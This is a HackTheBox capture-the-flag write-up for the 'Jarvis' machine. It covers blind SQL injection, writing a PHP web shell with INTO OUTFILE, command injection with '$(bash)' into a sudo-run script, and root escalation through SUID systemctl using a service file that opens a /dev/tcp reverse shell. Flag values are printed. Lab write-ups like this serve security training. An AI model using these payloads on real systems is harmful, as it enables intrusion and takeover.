---
layout: /src/layouts/MarkdownPostLayout_HTB.astro
title: Jarvis HackTheBox Write-Up
author: Adrian Reategui
description: ""
image:
  url: "/images/posts/jarvis_bg.png"
  alt: ""
pubDate: 2025-06-14
tags:
  ["linux", "machine", "writeup", "systemctl", "bypassing", "input", "python"]
languages: []
---

### SUMMARY
This machine has only two ports open, we found a SQLI vulnerability in the webpage on port 80 and when trying to dump the database we didint find any credentials nor anythign interesting. However when trying to upload a file into one of the routes we found we did it successfully! We uploaded out malicious php file and we were abel to obtain a RCE, I then send a revershell to my kali machine obtaining a shell as the user www-data. As www-data I found that I had a sudoers privilege to execute a python script as the user pepper, reading this script I found there was a user input, however it was sanitize, but I bypassed the sanitization by using special bash crafted payload being able to obtain a shell as the user pepper, this shell wasnt showing any output so I send another shell and I was able to read ouput in the new one. To escalate privielge I found systemctl SUID binary so I abuse it by creating a service that send a shell as the user root and when i run it i obtain a shell as the user root pwning the system

### NMAP
- Nmap scan report
	```
	# Nmap 7.95 scan initiated Fri May  9 09:40:18 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p22,80,64999 -oN targeted 10.10.10.143
	Nmap scan report for 10.10.10.143
	Host is up (0.28s latency).
	
	PORT      STATE SERVICE VERSION
	22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
	|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
	|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
	80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	|_http-title: Stark Hotel
	|_http-server-header: Apache/2.4.25 (Debian)
	64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
	|_http-title: Site doesn't have a title (text/html).
	|_http-server-header: Apache/2.4.25 (Debian)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Fri May  9 09:40:49 2025 -- 1 IP address (1 host up) scanned in 30.77 seconds
	```
### FOOTHOLD
- Found a webpage on port 80
	![alt](/images/posts/jarvis3.webp)
- When analizing the web I found a parameter that look interesting 
	![alt](/images/posts/jarvis4.webp)
- I tried different payloads however none was working til I tried SQL payloads, I was able to find that it was vulnerable by making the webpage sleep for 5 seconds
	![alt](/images/posts/jarvis5.webp)
- I then found that it was vulnerable to boolean blind sql injection however when dumping the contents of the database I didnt find any credentials or ways to access to the system
	![alt](/images/posts/jarvis6.webp)
- I fuzzed the webpage finding different directories
	![alt](/images/posts/jarvis7.webp)
- Nothing interesting so far but when I access to the images directory I found that I had directory lsiting permissions
	![alt](/images/posts/jarvis8.webp)
- So i thought to put a php file into the images directory by using the SQLinjection, however I had to find how many columns the database had and I did it by using the next payload. In order for the payload to work I dindt use '' because iot weasnt working
	![alt](/images/posts/jarvis9.webp)
- When trying a different number of columns in the payload I found that the Content-Lenght changed and it was the same number for the rest of the numbers but 7 so thats how I knew there was 7 columns total
	![alt](/images/posts/jarvis10.webp)
### RCE
- Once I knew there was 7 columns I decided to introduce my malicious payload using the following sentence and when sending the request I recevied a 200 OK
	```
	1 union select 1,2,3,4,5,6,"<?p sys(...);?>" INTO OUTFILE "/var/www/html/images/test.php"
	```
	![alt](/images/posts/jarvis11.webp)
- Checking on the images directory in the webpage I was able to find my file!
	![alt](/images/posts/jarvis12.webp)
- I then tested it and I was able to execute commands!
	![alt](/images/posts/jarvis13.webp)
- I send a revershell to my kali machine obtaining a shell successfully
	![alt](/images/posts/jarvis.webp)
### USER PIVOTING
- As the user www-data I found sudoers privileges that allowed me to execute a script as the user pepper
	![alt](/images/posts/jarvis14.webp)
- I read the script and found a function that allow us to execute a bash command, in this case ping by requesting a user input but had some special characters restrictions
	![alt](/images/posts/jarvis15.webp)
- I asked chatgpt what was wrong in the code and found this answer
	![alt](/images/posts/jarvis2.webp)
- So I ran the script and when prompted to introduce my input I use the $(bash) obtaining a bash as pepper
	![alt](/images/posts/jarvis16.webp)
### LOCAL
- I then was able to read pepper flag
	```
	pepper@jarvis:/dev/shm$ whoami && ifconfig && cat /home/pepper/user.txt
	pepper
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
	        inet 10.10.10.143  netmask 255.255.254.0  broadcast 10.10.11.255
	        inet6 fe80::250:56ff:fe94:b92e  prefixlen 64  scopeid 0x20<link>
	        inet6 dead:beef::250:56ff:fe94:b92e  prefixlen 64  scopeid 0x0<global>
	        ether 00:50:56:94:b9:2e  txqueuelen 1000  (Ethernet)
	        RX packets 559823  bytes 75304079 (71.8 MiB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 544915  bytes 714858699 (681.7 MiB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
	        inet 127.0.0.1  netmask 255.0.0.0
	        inet6 ::1  prefixlen 128  scopeid 0x10<host>
	        loop  txqueuelen 1  (Local Loopback)
	        RX packets 2484174  bytes 639930560 (610.2 MiB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 2484174  bytes 639930560 (610.2 MiB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	9c4419dce87f7b66b727182832af2e98
	```
### PRIVILEGE ESCALATION
- The bash wasnt working so I used to send me another shell, and with a working shell I found there was an interesting SUID binary
	![alt](/images/posts/jarvis17.webp)
- the GTFObins explanation wasnt very clear about how to exploit it so I found a different resource on github[READ HERE](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740)
	```TEST.SERVICE
	[Unit]
	Description=roooooooooot
	
	[Service]
	Type=simple
	User=root
	ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'
	
	[Install]
	WantedBy=multi-user.target
	```
- Once the test.service was created I then ran the following commands
	```
	/bin/systemctl enable /dev/shm/<name>.service
	/bin/systemctl start <name>
	```
	![alt](/images/posts/jarvis18.webp)
### ROOT
- I then read root flag
	```
	root@jarvis:/# whoami && ifconfig && cat /root/root.txt
	root
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
	        inet 10.10.10.143  netmask 255.255.254.0  broadcast 10.10.11.255
	        inet6 fe80::250:56ff:fe94:b92e  prefixlen 64  scopeid 0x20<link>
	        inet6 dead:beef::250:56ff:fe94:b92e  prefixlen 64  scopeid 0x0<global>
	        ether 00:50:56:94:b9:2e  txqueuelen 1000  (Ethernet)
	        RX packets 559766  bytes 75300139 (71.8 MiB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 544865  bytes 714854152 (681.7 MiB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
	        inet 127.0.0.1  netmask 255.0.0.0
	        inet6 ::1  prefixlen 128  scopeid 0x10<host>
	        loop  txqueuelen 1  (Local Loopback)
	        RX packets 2484174  bytes 639930560 (610.2 MiB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 2484174  bytes 639930560 (610.2 MiB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	12d9948e715f49220115e94bacd227a9
	```